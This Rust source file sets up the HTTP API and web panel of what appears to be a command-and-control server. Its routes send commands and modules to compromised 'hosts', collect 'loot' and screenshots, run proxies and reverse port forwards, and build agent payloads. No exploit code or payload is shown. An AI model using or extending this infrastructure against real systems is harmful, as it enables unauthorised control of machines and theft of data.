// src/api/mod.rs
pub mod state;
pub mod models;
pub mod middleware;
pub mod routes;

use axum::{
    routing::{get, post, delete},
    Router, middleware as axum_middleware,
    extract::{DefaultBodyLimit, Path},
    response::{IntoResponse, Response},
    http::{StatusCode, header},
};
use tower_http::cors::{CorsLayer, AllowOrigin};
use http::Method;
use http::HeaderValue;
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::PathBuf;

use crate::common::SharedSessions;
use crate::database::DbPool;

pub use state::{ApiContext, SharedResults, SharedProxies, SharedScripts, SharedListenerManager, SharedBuildJobs};
use crate::api::routes::downloads;
use crate::api::routes::iocs;
use crate::api::routes::{hosts, proxies, modules, history, operators, listeners, builder, topology, tasks};

pub use state::SharedResults as ResultsType;
pub use state::SharedProxies as ProxiesType;

// ── Panel static file serving ──────────────────────────────────────────

async fn serve_panel() -> Response {
    serve_file("index.html").await
}

async fn serve_static(Path(tail): Path<String>) -> Response {
    let relative = tail.trim_start_matches('/');
    if relative.contains("..") || relative.contains('\\') {
        return (StatusCode::BAD_REQUEST, "Invalid path").into_response();
    }
    serve_file(relative).await
}

async fn serve_file(relative_path: &str) -> Response {
    let cwd_candidate = std::env::current_dir()
        .unwrap_or_else(|_| PathBuf::from("."))
        .join("panel")
        .join(relative_path);

    let exe_candidate = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .map(|base| base.join("panel").join(relative_path));

    let candidates: Vec<PathBuf> = std::iter::once(cwd_candidate)
        .chain(exe_candidate)
        .collect();

    match candidates.into_iter().find(|p| p.is_file()) {
        None => (StatusCode::NOT_FOUND, "File not found").into_response(),
        Some(path) => match std::fs::read(&path) {
            Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, "Read error").into_response(),
            Ok(bytes) => (
                StatusCode::OK,
                [(header::CONTENT_TYPE, mime_type(relative_path))],
                bytes,
            ).into_response(),
        },
    }
}

fn mime_type(path: &str) -> &'static str {
    match path.rsplit('.').next().unwrap_or("") {
        "html" => "text/html; charset=utf-8",
        "js"   => "application/javascript; charset=utf-8",
        "css"  => "text/css; charset=utf-8",
        "png"  => "image/png",
        "ico"  => "image/x-icon",
        "svg"  => "image/svg+xml",
        "json" => "application/json",
        _      => "application/octet-stream",
    }
}

// ── API server ─────────────────────────────────────────────────────────

pub async fn start_api_server(
    sessions: SharedSessions,
    db: DbPool,
    results: SharedResults,
    proxies: SharedProxies,
    listener_mgr: SharedListenerManager,
    port: u16,
) {
    let scripts: SharedScripts = Arc::new(Mutex::new(HashMap::new()));
    let shared_state = Arc::new(ApiContext {
        sessions,
        db,
        results,
        proxies,
        scripts,
        listener_mgr,
        rportfwds:     Arc::new(Mutex::new(HashMap::new())),
        login_limiter: Arc::new(Mutex::new(HashMap::new())),
        build_jobs:    Arc::new(Mutex::new(HashMap::new())),
    });

    let allowed_origins = [
        "http://127.0.0.1:8080",
        "http://localhost:8080",
        "http://127.0.0.1:8081",
        "http://localhost:8081",
        "http://127.0.0.1",
        "http://localhost",
    ].map(|s| s.parse::<HeaderValue>().unwrap());

    let cors = CorsLayer::new()
        .allow_origin(AllowOrigin::list(allowed_origins))
        .allow_methods([Method::GET, Method::POST, Method::DELETE, Method::OPTIONS])
        .allow_headers([header::CONTENT_TYPE, header::HeaderName::from_static("x-api-key")])
        .max_age(std::time::Duration::from_secs(3600));

    // ── Public routes (no auth) ────────────────────────────────────────
    let public_routes = Router::new()
        .route("/", get(serve_panel))
        .route("/panel/*tail", get(serve_static))
        .route("/api/auth/login", post(operators::login))
        // Downloads served without auth so <img> tags work in the panel
        .route("/api/downloads/*path", get(downloads::serve_download));

    // ── Protected routes (X-API-KEY header required) ───────────────────
    let protected_routes = Router::new()
        .route("/api/auth/me",                    get(operators::whoami))
        .route("/api/operators",                  get(operators::list).post(operators::create))
        .route("/api/operators/:id",              delete(operators::delete))
        .route("/api/audit",                      get(operators::audit_log_handler))
        .route("/api/config/webhook",             get(operators::get_webhook).post(operators::set_webhook))
        .route("/api/config/recon",               get(operators::list_recon).post(operators::add_recon))
        .route("/api/config/recon/:id",           delete(operators::remove_recon))
        .route("/api/listeners",                  get(listeners::list).post(listeners::create))
        .route("/api/listeners/:id",              delete(listeners::delete))
        .route("/api/listeners/:id/start",        post(listeners::start))
        .route("/api/listeners/:id/stop",         post(listeners::stop))
        .route("/api/hosts",                      get(hosts::list_hosts))
        .route("/api/hosts/:id/command",          post(hosts::send_command))
        .route("/api/hosts/:id/output/:req_id",   get(hosts::get_output))
        .route("/api/hosts/:id/history",          get(history::get_history))
        .route("/api/history",                    get(history::get_global_history))
        .route("/api/hosts/:id/files/browse",     get(hosts::browse_files))
        .route("/api/hosts/:id/notes",            get(hosts::get_notes).post(hosts::add_note))
        .route("/api/hosts/:id/notes/:note_id",   delete(hosts::delete_note))
        .route("/api/broadcast",                  post(hosts::broadcast))
        .route("/api/broadcast/module",           post(modules::broadcast_module))
        .route("/api/modules",                    get(modules::list_modules))
        .route("/api/hosts/:id/modules/:module_name", post(modules::execute_module))
        .route("/api/hosts/:id/extensions/:filename", post(modules::deploy_extension))
        .route("/api/proxies",                    get(proxies::list_proxies))
        .route("/api/hosts/:id/proxy",            post(proxies::start_proxy).delete(proxies::stop_proxy))
        .route("/api/hosts/:id/proxy/check",      post(proxies::check_proxy_ip))
        .route("/api/hosts/:id/screenshots",       get(downloads::list_screenshots))
        .route("/api/loot",                       get(downloads::list_loot).delete(downloads::delete_loot))
        .route("/api/loot/zip",                   get(downloads::zip_loot))
        .route("/api/iocs",                       get(iocs::list_all))
        .route("/api/hosts/:id/iocs",             get(iocs::list_for_session).post(iocs::add))
        .route("/api/iocs/:id/clean",             post(iocs::mark_clean))
        .route("/api/iocs/:id",                   delete(iocs::delete))
        .route("/api/rportfwds",                  get(proxies::list_rportfwds))
        .route("/api/hosts/:id/rportfwd",         post(proxies::start_rportfwd).delete(proxies::stop_rportfwd))
        // Builder — all behind auth; download uses fetch+blob in JS so X-API-KEY is sent
        .route("/api/builder/build",              post(builder::start_build))
        .route("/api/builder/jobs",               get(builder::list_jobs))
        .route("/api/builder/jobs/:id/status",    get(builder::job_status))
        .route("/api/builder/jobs/:id/download",  get(builder::download_artifact))
        // Topology — passive route-planning over already-reported agent interfaces
        .route("/api/topology/plan",              get(topology::plan))
        .route("/api/topology/snapshot",          get(topology::snapshot))
        // Hibernation task queue — queue commands for low-beacon-rate agents
        .route("/api/hosts/:id/queue",            post(tasks::queue_task))
        .route("/api/hosts/:id/tasks",            get(tasks::list_tasks))
        .route("/api/hosts/:id/tasks/:task_id",   get(tasks::get_task))
        .route("/api/hosts/:id/tasks/:task_id",   delete(tasks::cancel_task))
        .route_layer(axum_middleware::from_fn_with_state(shared_state.clone(), middleware::auth));

    let app = public_routes
        .merge(protected_routes)
        .layer(DefaultBodyLimit::max(50 * 1024 * 1024))
        .layer(cors)
        .with_state(shared_state);

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    eprintln!("[+] API Endpoint: http://0.0.0.0:{}", port);
    eprintln!("[+] Web Panel:    http://127.0.0.1:{}", port);

    let server = axum::Server::bind(&addr)
        .serve(app.into_make_service_with_connect_info::<SocketAddr>());

    if let Err(e) = server.await {
        eprintln!("[-] API Server Error: {}", e);
    }
}
